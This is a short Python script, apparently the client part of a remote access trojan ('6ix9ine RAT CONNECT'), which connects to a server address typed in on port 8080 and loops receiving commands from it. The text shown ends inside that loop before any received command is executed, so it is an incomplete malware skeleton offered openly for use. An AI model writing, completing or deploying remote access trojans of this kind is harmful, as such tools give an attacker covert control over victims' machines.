import os
import socket

s = socket.socket()
port=8080
os.system("figlet -f slant 6ix9ine RAT CONNECT |lolcat -a")
host = input(str("Please enter the server address : "))
s.connect((host, port))
print("")
print("Connected to the server successfully")
print("")

while 1:
    command = s.recv(1024)
    command = command.decode()
    print("")
    print("Command received")
    print("")